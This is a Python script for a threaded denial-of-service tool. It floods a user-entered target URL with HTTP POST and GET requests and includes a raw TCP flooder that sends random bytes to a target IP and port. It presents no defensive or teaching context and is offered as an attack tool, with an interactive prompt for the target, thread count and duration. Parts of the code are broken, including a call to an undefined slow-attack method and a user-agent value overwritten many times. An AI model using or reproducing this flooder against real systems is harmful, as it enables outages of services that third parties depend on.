from re import U
import requests
import os
import threading
import time
import socket
import random


class Dos(threading.Thread):
    USER_AGENT = "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1"
    USER_AGENT = "Mozilla/5.0 (Linux; Android 4.4.2; Micromax A190 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Mobile Safari/537.36"
    USER_AGENT = "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-N9200 Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36"
    USER_AGENT = "Mozilla/5.0 (Linux; Android 5.1.1; SM-G925F Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 YaBrowser/16.2.0.5397.00 Mobile Safari/537.36"
    USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]"
    USER_AGENT = "Mozilla/5.0 (Macintosh; ARM Mac OS X) AppleWebKit/538.15 (KHTML, like Gecko) Safari/538.15 Version/6.0 Raspbian/8.0 (1:3.8.2.0-0rpi23rpi1g) Epiphany/3.8.2"
    USER_AGENT = "Mozilla/5.0 (Linux; Android 4.2.1; DA241HL Build/JOP40D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.94 Safari/537.36"
    USER_AGENT = "Mozilla/5.0 (Linux; Android 4.2.1; DA241HL Build/JOP40D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.64 Safari/537.36 OPR/36.0.2126.101126"
    USER_AGENT = "Mozilla/5.0 (Linux; Android 4.2.1; DA241HL Build/JOP40D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Safari/537.36"
    USER_AGENT = "Mozilla/5.0 (Linux; Android 4.2.1; DA241HL Build/JOP40D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Safari/537.36"
    USER_AGENT = "Mozilla/5.0 (Linux; Android 4.2.1; DA241HL Build/JOP40D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.94 Safari/537.36"
    USER_AGENT = "Mozilla/5.0 (Linux; Android 4.2.1; DA241HL Build/JOP40D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.64 Safari/537.36 OPR/36.0.2126.101126"
    USER_AGENT = "Mozilla/5.0 (Linux; Android 4.2.1; DA241HL Build/JOP40D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Safari/537.36"
    USER_AGENT = "Mozilla/5.0 (Linux; Android 4.2.1; DA241HL Build/JOP40D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Safari/537.36"
    USER_AGENT = "Mozilla/5.0 (Linux; Android 4.2.1; DA241HL Build/JOP40D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36"
    target_ip = ""
    target_port = 0

    def __init__(self, seq, attack_type, duration):
        super().__init__()
        self.seq = seq
        self.attack_type = attack_type
        self.duration = duration

    def run(self):
        start_time = time.time()
        while time.time() - start_time < self.duration:
            try:
                if self.attack_type == 1:
                    self.post_attack(Dos.url)
                elif self.attack_type == 2:
                    self.ssl_post_attack(Dos.url)
                elif self.attack_type == 3:
                    self.get_attack(Dos.url)
                elif self.attack_type == 4:
                    self.ssl_get_attack(Dos.url)
                elif self.attack_type == 5:
                    self.tcp_flooder(Dos.target_ip, Dos.target_port)
                elif self.attack_type == 6:
                    self.tcp_slow(Dos.target_ip, Dos.target_port)
            except Exception as e:
                pass

    @classmethod
    def check_connection(cls, url):
        try:
            response = requests.get(url, headers={"User-Agent": cls.USER_AGENT})
            if response.status_code == 200:
                print("Connection Success")
            cls.url = url
        except Exception as e:
            pass

    @classmethod
    def ssl_check_connection(cls, url):
        try:
            response = requests.get(url, headers={"User-Agent": cls.USER_AGENT}, verify=True)
            if response.status_code == 200:
                print("Connection Success")
            cls.url = url
        except Exception as e:
            pass

    @staticmethod
    def post_attack(url):
        try:
            response = requests.post(url, headers={"User-Agent": Dos.USER_AGENT, "Accept-Language": "en-US,en"},
                                     data="out of memory")
            print(f"Success Sent: {url} # Status ---> {response.status_code}")
        except Exception as e:
            pass

    @staticmethod
    def get_attack(url):
        try:
            response = requests.get(url, headers={"User-Agent": Dos.USER_AGENT})
            print(f"Success Sent: {url} # Status ---> {response.status_code}")
        except Exception as e:
            pass

    @staticmethod
    def ssl_post_attack(url):
        try:
            response = requests.post(url, headers={"User-Agent": Dos.USER_AGENT, "Accept-Language": "en-US,en"},
                                     data="out of memory", verify=True)
            print(f"Success Sent: {url} # Status ---> {response.status_code}")
        except Exception as e:
            pass

    @staticmethod
    def ssl_get_attack(url):
        try:
            response = requests.get(url, headers={"User-Agent": Dos.USER_AGENT}, verify=True)
            print(f"\033[1;33mSuccess Sent: \033[1;37m{url} \033[1;31m# \033[1;33mStatus \033[1;31m---> \033[1;32m{response.status_code}")
        except Exception as e:
            pass

    @staticmethod
    def tcp_flooder(target_ip, target_port):
        data = random._urandom(1024)
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                sock.send(data)
                print(f"\033[1;31m[\033[1;33mTCP-FLOODER\033[1;31m] \033[1;33mSuccess Sent: \033[1;37m{target_ip}:{target_port}")
                sock.close()
            except:
                pass

if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
  
    while True:        
        print("âââââââââââ  âââ ââââââ ââââââââââââ ââââââ ââââ   âââ")
        print("âââââââââââ  ââââââââââââââââââââââââââââââââââââ  âââ")
        print("  âââââ âââââââââââââââââââ   âââ   ââââââââââââââ âââ")
        print(" âââââ  âââââââââââââââââââ   âââ   ââââââââââââââââââ")
        print("âââââââââââ  ââââââ  ââââââ   âââ   âââ  ââââââ ââââââ")
        print("âââââââââââ  ââââââ  ââââââ   âââ   âââ  ââââââ  âââââ")

        url = input("Enter Target URL: ")
        Dos.url = url
        thread_count = int(input("Enter Threads: "))
        duration = int(input("Enter Time: "))

        for i in range(thread_count):
            dos = Dos(i, 1, duration)
            dos.start()
        q = input("ENTER TO ATTACK: ")

        if q.lower() != 'y':
            break

